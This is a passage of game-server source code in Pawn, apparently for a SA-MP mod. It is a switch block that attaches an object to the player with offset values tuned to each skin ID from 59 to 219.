		case 59: SetPlayerAttachedObject( playerid, 1, model, 2, 0.180506, 0.006264, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 59
		case 60: SetPlayerAttachedObject( playerid, 1, model, 2, 0.180506, 0.006264, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 60
		case 61: SetPlayerAttachedObject( playerid, 1, model, 2, 0.180506, 0.006264, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 61
		case 62: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.023522, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 62
		case 63: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.004900, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 63
		case 64: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.004900, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 64
		case 65: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.004900, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 65
		case 66: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.011196, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 66
		case 67: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.011196, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 67
		case 68: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.011196, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 68
		case 69: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.011196, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 69
		case 70: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.009975, 0.011316, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 70
		case 71: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.009975, 0.011316, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 71
		case 72: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.020482, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 72
		case 73: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.020482, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 73
		case 74: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.002100, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 74
		case 75: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, 0.002100, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 75
		case 76: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.009375, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 76
		case 77: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.009375, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 77
		case 78: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.009375, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 78
		case 79: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153101, -0.009375, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 79
		case 80: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138384, -0.015113, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 80
		case 81: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138384, -0.015113, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 81
		case 82: SetPlayerAttachedObject( playerid, 1, model, 2, 0.188178, 0.017015, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 82
		case 83: SetPlayerAttachedObject( playerid, 1, model, 2, 0.188178, 0.017015, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 83
		case 84: SetPlayerAttachedObject( playerid, 1, model, 2, 0.188178, -0.004219, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 84
		case 85: SetPlayerAttachedObject( playerid, 1, model, 2, 0.188178, -0.004219, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 85
		case 86: SetPlayerAttachedObject( playerid, 1, model, 2, 0.136243, -0.004046, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 86
		case 87: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158262, 0.028254, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 87
		case 88: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158262, 0.028254, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 88
		case 89: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151486, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 89
		case 90: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164169, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 90
		case 91: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164169, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 91
		case 92: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164169, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 92
		case 93: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164169, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 93
		case 94: SetPlayerAttachedObject( playerid, 1, model, 2, 0.110970, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 94
		case 95: SetPlayerAttachedObject( playerid, 1, model, 2, 0.127067, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 95
		case 96: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158763, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 96
		case 97: SetPlayerAttachedObject( playerid, 1, model, 2, 0.139774, -0.012409, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 97
		case 98: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164045, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 98
		case 99: SetPlayerAttachedObject( playerid, 1, model, 2, 0.164045, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 99
		case 100: SetPlayerAttachedObject( playerid, 1, model, 2, 0.181303, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 100
		case 101: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167212, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 101
		case 102: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167212, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 102
		case 103: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167212, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 103
		case 104: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167212, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 104
		case 105: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167212, 0.003758, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 105
		case 106: SetPlayerAttachedObject( playerid, 1, model, 2, 0.185643, -0.006704, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 106
		case 107: SetPlayerAttachedObject( playerid, 1, model, 2, 0.185643, -0.006704, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 107
		case 108: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176239, -0.006704, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 108
		case 109: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176239, 0.008243, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 109
		case 110: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176239, 0.008243, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 110
		case 111: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176239, -0.003313, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 111
		case 112: SetPlayerAttachedObject( playerid, 1, model, 2, 0.140058, -0.003313, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 112
		case 113: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172263, 0.006964, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 113
		case 114: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172263, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 114
		case 115: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172263, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 115
		case 116: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172263, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 116
		case 117: SetPlayerAttachedObject( playerid, 1, model, 2, 0.123344, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 117
		case 118: SetPlayerAttachedObject( playerid, 1, model, 2, 0.123344, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 118
		case 119: SetPlayerAttachedObject( playerid, 1, model, 2, 0.159842, 0.005701, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 119
		case 120: SetPlayerAttachedObject( playerid, 1, model, 2, 0.159842, -0.009245, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 120
		case 121: SetPlayerAttachedObject( playerid, 1, model, 2, 0.159842, -0.009245, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 121
		case 122: SetPlayerAttachedObject( playerid, 1, model, 2, 0.159842, -0.009245, 0.004102, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 122
		case 123: SetPlayerAttachedObject( playerid, 1, model, 2, 0.194358, -0.009245, -0.008579, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 123
		case 124: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168926, -0.009245, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 124
		case 125: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168926, 0.006851, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 125
		case 126: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168926, -0.009382, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 126
		case 127: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168926, 0.000999, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 127
		case 128: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168926, 0.024238, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 128
		case 129: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144890, 0.004670, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 129
		case 130: SetPlayerAttachedObject( playerid, 1, model, 2, 0.109372, 0.004670, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 130
		case 131: SetPlayerAttachedObject( playerid, 1, model, 2, 0.141611, 0.004670, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 131
		case 132: SetPlayerAttachedObject( playerid, 1, model, 2, 0.057620, 0.007382, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 132
		case 133: SetPlayerAttachedObject( playerid, 1, model, 2, 0.057620, 0.007382, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 133
		case 134: SetPlayerAttachedObject( playerid, 1, model, 2, 0.057620, 0.007382, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 134
		case 135: SetPlayerAttachedObject( playerid, 1, model, 2, 0.057620, 0.007382, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 135
		case 136: SetPlayerAttachedObject( playerid, 1, model, 2, 0.131672, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 136
		case 137: SetPlayerAttachedObject( playerid, 1, model, 2, 0.131672, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 137
		case 138: SetPlayerAttachedObject( playerid, 1, model, 2, 0.145482, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 138
		case 139: SetPlayerAttachedObject( playerid, 1, model, 2, 0.145482, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 139
		case 140: SetPlayerAttachedObject( playerid, 1, model, 2, 0.186944, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 140
		case 141: SetPlayerAttachedObject( playerid, 1, model, 2, 0.177850, -0.020384, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 141
		case 142: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162902, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 142
		case 143: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162902, -0.001954, 0.003209, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 143
		case 144: SetPlayerAttachedObject( playerid, 1, model, 2, 0.205876, -0.027250, -0.004153, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 144
		case 145: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.005472, -0.004153, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 145
		case 146: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.005472, -0.004153, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 146
		case 147: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 147
		case 148: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 148
		case 149: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 149
		case 150: SetPlayerAttachedObject( playerid, 1, model, 2, 0.160719, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 150
		case 151: SetPlayerAttachedObject( playerid, 1, model, 2, 0.173401, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 151
		case 152: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167766, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 152
		case 153: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167766, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 153
		case 154: SetPlayerAttachedObject( playerid, 1, model, 2, 0.131260, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 154
		case 155: SetPlayerAttachedObject( playerid, 1, model, 2, 0.131260, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 155
		case 156: SetPlayerAttachedObject( playerid, 1, model, 2, 0.192687, -0.016239, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 156
		case 157: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.014873, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 157
		case 158: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.014873, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 158
		case 159: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.014873, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 159
		case 160: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, -0.003556, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 160
		case 161: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, -0.003556, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 161
		case 162: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 162
		case 163: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 163
		case 164: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 164
		case 165: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 165
		case 166: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 166
		case 167: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 167
		case 168: SetPlayerAttachedObject( playerid, 1, model, 2, 0.149395, 0.003181, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 168
		case 169: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162078, -0.017747, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 169
		case 170: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162078, 0.004271, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 170
		case 171: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162078, 0.004271, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 171
		case 172: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162078, 0.004271, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 172
		case 173: SetPlayerAttachedObject( playerid, 1, model, 2, 0.162078, 0.004271, 0.004263, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 173
		case 174: SetPlayerAttachedObject( playerid, 1, model, 2, 0.191174, 0.019861, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 174
		case 175: SetPlayerAttachedObject( playerid, 1, model, 2, 0.191174, 0.019861, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 175
		case 176: SetPlayerAttachedObject( playerid, 1, model, 2, 0.179688, -0.004609, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 176
		case 177: SetPlayerAttachedObject( playerid, 1, model, 2, 0.207318, -0.004609, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 177
		case 178: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178637, -0.004609, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 178
		case 179: SetPlayerAttachedObject( playerid, 1, model, 2, 0.155398, 0.003675, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 179
		case 180: SetPlayerAttachedObject( playerid, 1, model, 2, 0.187603, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 180
		case 181: SetPlayerAttachedObject( playerid, 1, model, 2, 0.185789, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 181
		case 182: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137889, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 182
		case 183: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137889, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 183
		case 184: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167829, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 184
		case 185: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167829, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 185
		case 186: SetPlayerAttachedObject( playerid, 1, model, 2, 0.167829, -0.005275, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 186
		case 187: SetPlayerAttachedObject( playerid, 1, model, 2, 0.157367, -0.017958, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 187
		case 188: SetPlayerAttachedObject( playerid, 1, model, 2, 0.157367, -0.003010, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 188
		case 189: SetPlayerAttachedObject( playerid, 1, model, 2, 0.157367, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 189
		case 190: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 190
		case 191: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 191
		case 192: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 192
		case 193: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 193
		case 194: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 194
		case 195: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175797, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 195
		case 196: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 196
		case 197: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 197
		case 198: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, -0.005583, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 198
		case 199: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, 0.009363, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 199
		case 200: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, -0.003318, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 200
		case 201: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, -0.003318, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 201
		case 202: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138831, 0.031243, 0.002032, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 202
		case 203: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161976, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 203
		case 204: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161976, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 204
		case 205: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161976, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 205
		case 206: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161976, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 206
		case 207: SetPlayerAttachedObject( playerid, 1, model, 2, 0.116949, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 207
		case 208: SetPlayerAttachedObject( playerid, 1, model, 2, 0.125234, 0.007214, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 208
		case 209: SetPlayerAttachedObject( playerid, 1, model, 2, 0.146650, -0.013561, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 209
		case 210: SetPlayerAttachedObject( playerid, 1, model, 2, 0.125317, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 210
		case 211: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144065, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 211
		case 212: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144065, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 212
		case 213: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144065, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 213
		case 214: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144065, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 214
		case 215: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144065, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 215
		case 216: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161322, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 216
		case 217: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161322, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 217
		case 218: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161322, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 218
		case 219: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161322, -0.000878, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 219
